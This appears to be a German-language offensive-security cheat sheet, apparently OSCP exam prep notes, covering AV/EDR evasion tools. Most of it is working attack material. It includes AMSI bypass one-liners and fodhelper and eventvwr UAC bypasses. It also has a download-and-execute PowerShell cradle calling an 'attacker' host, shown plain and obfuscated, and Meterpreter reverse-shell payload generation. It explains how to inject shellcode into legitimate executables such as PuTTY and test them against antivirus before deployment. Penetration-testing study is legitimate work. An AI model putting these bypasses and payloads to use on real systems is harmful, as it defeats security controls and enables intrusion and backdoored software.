# Evasion & Obfuscation Tools

AV/EDR Evasion, Payload Obfuscation und AMSI Bypass Tools.

---

## Invoke-Obfuscation

### Was ist Invoke-Obfuscation?

PowerShell Script/Command Obfuscation Framework. Macht PowerShell-Code unleserlich für AV.

### Installation

```powershell
# Download
git clone https://github.com/danielbohannon/Invoke-Obfuscation
cd Invoke-Obfuscation
Import-Module .\Invoke-Obfuscation.psd1

# Oder
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielbohannon/Invoke-Obfuscation/master/Invoke-Obfuscation.ps1')
```

### Usage

```powershell
# Start Interactive Mode
Invoke-Obfuscation

# Kommandos im Tool:
SET SCRIPTPATH C:\path\to\script.ps1
SET SCRIPTBLOCK {IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')}

# Obfuscation Methods:
TOKEN      # Token-based obfuscation
AST        # Abstract Syntax Tree obfuscation
STRING     # String obfuscation
ENCODING   # Encoding obfuscation
COMPRESS   # Compression
LAUNCHER   # Obfuscated launcher

# Example:
TOKEN
ALL
1          # Apply all token obfuscations
OUT obfuscated.ps1
```

### Quick Obfuscation Examples

```powershell
# Original
IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')

# Obfuscated (Example)
.( $PsHOME[4]+$PSHome[30]+'X')(NeW-OBjEct Net.WebClient)."`D`owNLoAdSTr`Ing"('h'+'ttp://attacker/shell.ps1')
```

### Launcher Obfuscation

```powershell
# Obfuscate PowerShell command line
LAUNCHER
STDIN+
1

# Result: Obfuscated launcher command
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc BASE64_ENCODED_COMMAND
```

---

## Veil

### Was ist Veil?

Payload Generator mit AV Evasion. Generiert diverse Payload-Formate.

### Installation

```bash
# Kali
sudo apt install veil

# Oder GitHub
git clone https://github.com/Veil-Framework/Veil
cd Veil
./config/setup.sh
```

### Usage

```bash
# Start Veil
veil

# Oder direkt Evasion
veil-evasion
```

### Payload Generation

```bash
# In Veil:
use evasion

# Liste payloads
list

# Wähle Payload (z.B. c/meterpreter/rev_tcp.py)
use 31

# Set options
set LHOST 10.10.14.5
set LPORT 4444

# Generate
generate

# Payload Name
MyPayload

# Output: /var/lib/veil/output/compiled/MyPayload.exe
```

### Best Payloads für Evasion

```
c/meterpreter/rev_tcp.py          # C-based Meterpreter
powershell/shellcode_inject/*     # PowerShell injection
python/shellcode_inject/*         # Python-based
go/meterpreter/rev_tcp.py         # Golang (besser für Evasion)
```

---

## Shellter

### Was ist Shellter?

Dynamic Shellcode Injection Tool. Injiziert Shellcode in legitime PEs.

### Installation

```bash
# Kali
sudo apt install shellter

# Windows: Download von Website
https://www.shellterproject.com/
```

### Usage (Kali mit Wine)

```bash
# Start Shellter
shellter

# Oder
wine shellter.exe
```

### Workflow

```
1. Operation Mode: A (Auto)
2. PE Target: /path/to/legitimate.exe (z.B. PuTTY.exe)
3. Stealth Mode: Y
4. Payload: L (Listed)
5. Select: 1 (Meterpreter_Reverse_TCP)
6. LHOST: 10.10.14.5
7. LPORT: 4444
8. Obfuscation: Y
```

### Best Practices

```bash
# Use legitimate, commonly-used executables:
- putty.exe
- WinSCP.exe
- 7zip.exe
- FileZilla.exe

# Sign with certificate (advanced)
# Use obfuscation
# Test gegen AV bevor deployment
```

---

## AMSI Bypass (PowerShell)

### Was ist AMSI?

AntiMalware Scan Interface - scannt PowerShell/JScript zur Runtime. Muss oft bypassed werden.

### Bypass Methods

#### Method 1: Reflection

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Method 2: Patching

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

#### Method 3: Obfuscated (weniger Detections)

```powershell
$a='si';$b='Am';$c='ls'
IEX([string]::join('',((($b+$a+$c).ToCharArray()|ForEach-Object{[char]([int]$_)})|ForEach-Object{$_})) -join '')
```

#### Method 4: Matt Graeber's One-Liner

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

---

## UAC Bypass Methods

### UAC Bypass - FodhelperBypass

```powershell
# Registry-based UAC Bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c C:\Temp\payload.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### UAC Bypass - EventVwr

```powershell
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c C:\Temp\payload.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.exe"
```

---

## Donut

### Was ist Donut?

Shellcode-Generator für .NET Assemblies, VBScript, JScript, EXE, DLL.

### Installation

```bash
# GitHub
git clone https://github.com/TheWover/donut
cd donut
make
```

### Usage

```bash
# Generate Shellcode from .NET Assembly
./donut -f MyAssembly.exe -o shellcode.bin

# Mit Parameters
./donut -f MyTool.exe -p "arg1 arg2" -o shellcode.bin

# Verschlüsselung
./donut -f tool.exe -e 1 -o shellcode.bin

# Für verschiedene Arch
./donut -f tool.exe -a x64 -o shellcode.bin
```

### Injection

```bash
# Shellcode in Prozess injizieren (mit anderen Tools)
# z.B. Process Injection via PowerShell/C#
```

---

## Vergleich

| Tool | Type | AV Evasion | Difficulty | Best Use |
|------|------|------------|------------|----------|
| **Invoke-Obfuscation** | Obfuscator | ⭐⭐⭐ | Easy | PowerShell Scripts |
| **Veil** | Generator | ⭐⭐⭐ | Easy | Standalone Payloads |
| **Shellter** | Injector | ⭐⭐⭐⭐ | Medium | PE Backdooring |
| **Donut** | Shellcode Gen | ⭐⭐⭐⭐ | Medium | .NET → Shellcode |
| **AMSI Bypass** | Bypass | ⭐⭐⭐⭐ | Easy | PowerShell Execution |

---

## Workflow: AV Evasion

```bash
# 1. Payload generieren (Meterpreter/Custom)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o payload.exe

# 2. Obfuscate mit Shellter
shellter
# → Inject in legitimate.exe

# 3. Test gegen AV
# VirusTotal (NICHT für real engagements!)
# Oder privat: https://antiscan.me

# 4. Falls nötig: Re-obfuscate oder anderen Payload
```

---

## OSCP Exam Notes

**Wichtig:** Im OSCP Exam sind AV-Bypässe NICHT der Fokus. Tools wie Metasploit sind limitiert (nur einmal). Fokus auf:

1. **Native Tools** - Living-off-the-land
2. **Custom Scripts** - Eigene anpassen
3. **Known Exploits** - Öffentliche PoCs

**Evasion Tools für OSCP:**
- **AMSI Bypass** - Oft nötig für PowerShell Tools
- **Obfuscation** - Bei Bedarf, aber nicht zwingend
- **Veil/Shellter** - Optional, meist nicht nötig

---

## Resources

- Invoke-Obfuscation: https://github.com/danielbohannon/Invoke-Obfuscation
- Veil: https://github.com/Veil-Framework/Veil
- Shellter: https://www.shellterproject.com/
- Donut: https://github.com/TheWover/donut
- AMSI Bypass Collection: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
